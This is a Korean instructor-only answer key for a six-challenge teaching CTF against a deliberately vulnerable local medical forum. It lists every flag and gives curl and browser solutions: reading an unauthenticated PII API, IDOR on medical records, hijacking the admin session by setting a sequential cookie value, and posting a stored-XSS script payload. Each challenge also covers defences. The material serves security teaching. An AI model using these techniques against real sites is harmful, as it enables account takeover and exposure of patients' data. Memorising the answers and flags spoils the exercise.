# 🔐 mini-CTF 정답 풀이 (강사·관리자 전용)

> ⚠️ **학생 배부 금지.** 이 문서에는 모든 깃발(flag)과 정확한 획득 절차가 들어 있다.
> 수업 종료 후 교재로 배부할 때만 공개한다.
>
> 표적: **MediForum** `http://<victim-ip>:3003` (아래 예시는 `localhost` 기준 — 실제 IP로 바꿔 사용).
> 각 문제는 브라우저만으로도, `curl` 로도 풀 수 있게 두 방법을 모두 적었다.

| # | 문제 | 취약점 | 깃발 |
|---|------|--------|------|
| 1 | 페이지 속 깃발 | 정보 노출(소스 주석) | `flag{v13w_s0urc3_r3con}` |
| 2 | 인증 없는 회원 API | Broken Auth + PII 노출 | `flag{n0_4uth_us3r_ap1}` |
| 3 | 남의 진료기록 | IDOR | `flag{1d0r_m3d_r3c0rds}` |
| 4 | 관리자 쪽지 도청 | Broken Admin Auth | `flag{4dm1n_dm_l34k}` |
| 5 | 예측 가능한 세션 | Predictable Session | `flag{pr3d1ct4bl3_s3ss10n}` |
| 6 | 저장형 XSS | Stored XSS + 봇 | `flag{st0r3d_xss_4dm1n_b0t}` |

---

## 1. 페이지 속 깃발 (Recon, 50점) — `flag{v13w_s0urc3_r3con}`

**개념.** 화면에 렌더링되지 않는 정보도 HTML 소스에는 남아 있다. 게시글 본문이 `|safe` 로
출력되어, 본문에 넣은 HTML 주석이 페이지 소스에 그대로 들어간다.

**브라우저 풀이.**
1. `http://localhost:3003` 접속 → 게시판에서 **[공지] 의료정보 무단 전송 금지** 글(글 id 4)을 연다.
2. `Ctrl+U` (소스 보기) 또는 F12 → Elements.
3. 본문 근처의 HTML 주석을 찾는다:
   `<!-- TODO(admin): 임시 메모 지우기 flag{v13w_s0urc3_r3con} -->`

**curl 풀이.**
```bash
curl -s http://localhost:3003/posts/4 | grep -o 'flag{[^}]*}'
# → flag{v13w_s0urc3_r3con}
```

**왜 뚫리나 / 방어.** 민감 정보를 주석·소스에 남기지 않는다. 디버그 메모는 배포 전 제거.

---

## 2. 인증 없는 회원 API (Web, 100점) — `flag{n0_4uth_us3r_ap1}`

**개념.** `/api/users` 가 **로그인 검사 없이** 전체 회원의 PII(email/ssn/phone/api_key)를 평문
JSON 으로 내준다. 관리자 계정의 `api_key` 자리에 깃발이 들어 있다.

**브라우저 풀이.**
1. 주소창에 `http://localhost:3003/api/users` 입력(로그인 불필요).
2. JSON 에서 `"role":"admin"` 인 항목의 `"api_key"` 값을 본다.

**curl 풀이.**
```bash
curl -s http://localhost:3003/api/users | python3 -m json.tool | grep -A1 '"role": "admin"' 
# 또는 통째로:
curl -s http://localhost:3003/api/users | grep -o 'flag{[^}]*}'
# → flag{n0_4uth_us3r_ap1}
```

**왜 뚫리나 / 방어.** 인증·인가 누락(Broken Access Control) + 민감필드 미마스킹. API 에 인증을
강제하고, 응답에서 ssn/api_key 를 제거하거나 마스킹한다. (참고: `/api/admin/users` 도 인증 0)

---

## 3. 남의 진료기록 — IDOR (Web, 150점) — `flag{1d0r_m3d_r3c0rds}`

**개념.** `/api/medical-records/<id>` 가 **요청자 소유 여부를 검증하지 않아**, id 만 바꾸면 누구의
진료기록이든 열린다. 한 기록의 처방(prescription)에 깃발이 숨어 있다.

**브라우저/`curl` 풀이.**
```bash
# 전체 목록(인증 0)에서 한 번에:
curl -s http://localhost:3003/api/medical-records | grep -o 'flag{[^}]*}'
# 또는 id 를 1,2,3,4,5 로 순회:
for i in 1 2 3 4 5; do echo "== record $i =="; curl -s http://localhost:3003/api/medical-records/$i; echo; done
# 깃발은 '원장 종합검진' 기록(처방 칸)에 있음 → flag{1d0r_m3d_r3c0rds}
```

**왜 뚫리나 / 방어.** IDOR — 객체 접근 시 소유/권한 검증을 반드시 한다
(`record.patient_id == current_user.id` 또는 담당 의사만).

---

## 4. 관리자 쪽지 도청 (Web, 150점) — `flag{4dm1n_dm_l34k}`

**개념.** `/api/admin/dms` 가 **인증 없이** 모든 사용자의 DM 을 덤프한다. 관리자가 보낸 쪽지 본문에
백업 비밀번호로 위장한 깃발이 들어 있다.

**브라우저/`curl` 풀이.**
```bash
curl -s http://localhost:3003/api/admin/dms | grep -o 'flag{[^}]*}'
# → flag{4dm1n_dm_l34k}
```

**왜 뚫리나 / 방어.** "admin" 경로명에 의존한 가짜 보안(security by obscurity). 관리자 API 는
역할 기반 인증(RBAC)으로 보호한다.

---

## 5. 예측 가능한 세션 (Web, 200점, 응용) — `flag{pr3d1ct4bl3_s3ss10n}`

**개념.** 로그인 시 발급되는 세션 쿠키 `MFSID` 가 `sess-2001`, `sess-2002` … 처럼 **순차 증가**한다
(V14). 관리자는 **가장 먼저** 로그인해 `sess-1001` 을 갖는다. 이 값으로 쿠키를 바꾸면 관리자로
인증되어, 관리자 전용 경로 `/admin/secret` 의 깃발을 얻는다.

**브라우저 풀이.**
1. 아무 계정으로 회원가입/로그인 → F12 → **Application → Cookies** 에서 내 `MFSID`(예: `sess-2003`) 확인.
2. 규칙을 관찰: `sess-<숫자>`, 내 번호는 큰 편 → 관리자는 더 이른(작은) 번호.
3. 쿠키 `MFSID` 값을 **`sess-1001`** 로 직접 수정.
4. `http://localhost:3003/admin/secret` 접속 → `{"flag":"flag{pr3d1ct4bl3_s3ss10n}", ...}`.

**curl 풀이.**
```bash
curl -s -b 'MFSID=sess-1001' http://localhost:3003/admin/secret
# → ...flag{pr3d1ct4bl3_s3ss10n}...
```
참고: 인증 없이는 403 이 떨어진다.
```bash
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:3003/admin/secret   # 403
```

**왜 뚫리나 / 방어.** 세션 ID 는 추측 불가능한 난수(예: 128bit 이상 CSPRNG)로 발급해야 한다.
순차/시간 기반 ID 는 세션 하이재킹을 부른다. 쿠키에 `HttpOnly/Secure/SameSite` 도 설정.

---

## 6. 저장형 XSS — 관리자 봇 낚기 (Web, 200점, 응용) — `flag{st0r3d_xss_4dm1n_b0t}`

**개념.** 게시글/댓글 본문이 `{{ body|safe }}` 로 **이스케이프 없이** 렌더링된다(저장형 XSS).
실제 환경이라면 그 글을 보는 다른 사용자의 브라우저에서 스크립트가 실행된다. 본 CTF 는 이를
시뮬레이션하는 **관리자 봇 경로** `/admin/review` 를 둔다 — 저장된 글/댓글에 `<script>` 가 있으면
관리자가 열람한 것으로 간주하고 깃발을 내준다.

**풀이(브라우저 + curl 혼합).**
1. 회원가입/로그인 (예: 사이트에서 `student1@user.kr` 로 가입).
2. **글쓰기**(`/posts/new`)에서 본문에 스크립트를 넣어 저장:
   - 제목: 아무거나, 본문: `<script>alert('xss')</script>`
   - 또는 기존 글의 **댓글**에 같은 내용을 저장해도 된다.
3. 관리자 봇 검토 경로를 호출:
   ```bash
   curl -s http://localhost:3003/admin/review | grep -o 'flag{[^}]*}'
   # → flag{st0r3d_xss_4dm1n_b0t}
   ```
   (스크립트가 하나도 없으면 `{"xss_triggered": false, ...}` 가 나오니, 2번을 먼저 수행)

**curl 만으로 끝내기(참고).**
```bash
# 로그인 → 쿠키 저장
curl -s -c /tmp/ck -d 'email=alice@user.kr&password=alice123' http://localhost:3003/login -o /dev/null
# 스크립트가 담긴 글 작성
curl -s -b /tmp/ck -d 'title=t&body=<script>alert(1)</script>&tag=tip' http://localhost:3003/posts/new -o /dev/null
# 관리자 봇 검토 → 깃발
curl -s http://localhost:3003/admin/review | grep -o 'flag{[^}]*}'
```

**왜 뚫리나 / 방어.** 사용자 입력을 출력 시 항상 이스케이프(자동 이스케이프 유지, `|safe` 금지),
필요 시 콘텐츠 보안 정책(CSP) 적용, 위험 태그 필터링.

---

## 채점·운영 메모
- 6문제 합계 **850점**. 권장 진행: 1·2(워밍업) → 3·4(중급) → 5·6(응용 보스).
- 깃발은 모두 `flag{...}` 정적 매칭. `import_challenges.py` 가 CTFd 에 그대로 등록한다.
- 표적을 재기동(`stop.sh purge` 후 `start.sh`)하면 MediForum DB 가 초기화되며 깃발은 동일하게 다시 심긴다.
- AI 도우미는 깃발을 절대 노출하지 않는다(응답 내 `flag{...}` 자동 가림). 안심하고 학생에게 열어줘도 된다.
